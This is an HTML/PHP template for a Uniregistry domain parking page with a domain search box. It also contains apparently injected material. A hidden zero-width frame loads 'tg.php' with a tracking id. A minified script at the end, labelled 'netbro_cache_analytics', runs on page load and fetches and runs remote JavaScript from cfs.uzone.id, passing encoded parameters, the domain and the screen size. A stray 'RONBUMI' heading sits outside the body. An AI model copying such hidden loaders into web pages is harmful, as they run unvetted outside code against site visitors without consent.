<!DOCTYPE html>

<html>
<head>
  <!-- Meta content -->
  <meta charset="utf-8">
  <meta name="description" content="<?php echo $_SERVER['HTTP_HOST'];?> was just registered at Uniregistry.com">
  <title>Welcome to <?php echo $_SERVER['HTTP_HOST'];?></title>
  <!-- JavaScript -->
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
  <!-- CSS -->
  <link rel="stylesheet" type="text/css" href="css/uniregistry-postregistration/proxima.css">
  <link rel="stylesheet" type="text/css" href="css/uniregistry-postregistration/uniregistry-core.min.css">
  <link rel="stylesheet" type="text/css" href="css/uniregistry-postregistration/post-registration.css">
</head>

<body>
	<?php include('tagmanager.php');?>
	<?php include('asite.php');?>
  <header>
    <div class="container">
      <img src="/images/uniregistry-postregistration/ur-logo@2x.png">
    </div>
  </header>

  <frameset cols="0,*" border=0>
    <frame name="top" src="tg.php?uid=iiijs5760733093d815.11173293" scrolling=no frameborder=0 noresize framespacing=0 marginwidth=0 marginheight=0>
  </frameset>

  <div class="overlay"></div>
  <div class="center-wrapper" style="display:none">
    <h1 class="welcome text-center"><!-- To be populated by Javascript below --></h1>
    <h3 class="text-center">This name was just registered on Uniregistry.com</h3>
    <p>Want your own domain name? With new generic domain extensions like .link, .gift, .pics and .sexy, you have millions of new possibilities. Search for your new name below.</p>
    <div class="searchbox">
      <a class="btn btn-lg btn-primary pull-right">Go</a>
      <div class="form-group">
        <input class="form-control input-lg search-input" placeholder="Search for a domain name">
      </div>
    </div>
    <p class="text-center"><small>Is this your domain name? Visit <a href="//uniregistry.com">Uniregistry.com</a> and log into your account to manage it.</small></p>
  </div>
  <script type="text/javascript">
  var domainName  = "<?php echo $_SERVER['HTTP_HOST'];?>",
      extension   = "xyz",
      searchVal   = "";

  $( function() {
    // Show the right background based on CSS
    $('body').addClass(extension);
    // Supply the domain name text
    $('.welcome').html('Welcome to ' + domainName);
    $('.center-wrapper').fadeIn(500);

    // Search on click
    $('.searchbox .btn').on('click', function(e){
      e.preventDefault();
      doSearch( $('.searchbox input').val() );
    });

    // If the search has a value, allow it
    $('.searchbox input').on('keyup', function(e) {
      if (e.which === 13) {
        doSearch(e.target.value);
      }
    });

    function doSearch(searchVal) {
      if (searchVal.length) {
        window.location = encodeURI('//uniregistry.com/?q=' + searchVal + '&utm_campaign=postregistration&utm_source=uniregistry&utm_media=newname');
      }
    }
  });
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnI%2fucvOQAaCh%2f7xELCCQLHPBkpLBszI6UUQyeru3cGTsmqsdpBs8F0rZlV9cOjGwaR8YGDUd88rkiYipdqNAWPiJT%2b%2b5wC1cyhCpGchLrANw0sdcbfHPl4OzJgYi%2bETr9ke8C5Hfq2fLDQiOe2WOPjwL0nBHawj4M4hOOwvp40XHB0pYoTxXID9P%2bVX0jWRhUMZHD7Xa0NbtnQKgcxRdRAFH2NYwgyZz%2fxZ1gMCDkNP9mjaRUunAL6QWOwmNMie8GeVmrenrcWex7RjjfTC9FX6YVJ7pA%2bJ6dS0SDkNYgoCPsI%2fJtqWlWj9PsbxlXccFGGeGfsruBcyBVSbpLm%2bTMOS00yNTqL9Z1fRbXPS%2fhqbafsoCt9Ia%2f5UaTr%2fe0grl5Vs8aDaIGIJjWpcdvS8eVQs6F8by%2bd%2fW1kDdIxMgnPLVp%2fo5QYkJzB3YSshVVfkesp4cln2aJhb6uFimrUU7MdFAjRIjqI7ip" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<p><h3>RONBUMI</h3></p>
</html>
